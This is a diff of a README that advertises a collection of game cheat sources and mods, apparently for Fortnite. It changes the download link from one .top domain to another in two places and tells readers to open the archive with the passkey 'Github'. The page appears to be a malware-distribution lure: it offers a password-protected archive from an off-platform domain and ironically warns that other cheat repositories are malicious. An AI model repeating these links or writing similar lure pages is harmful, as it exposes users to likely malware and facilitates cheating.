@@ -9,7 +9,7 @@ Collection of publicly available repositories — cheat sources, mod archives, s
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -92,7 +92,7 @@ Many Fortnite cheat repositories contain malicious code. One example (`Fortnite-
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download the collection.
+1. Click **[CLICK](https://gitdownapply.top)** to download the collection.
 
 2. Choose your tool:
    - **Mods** — place `.pak` files in the game directory
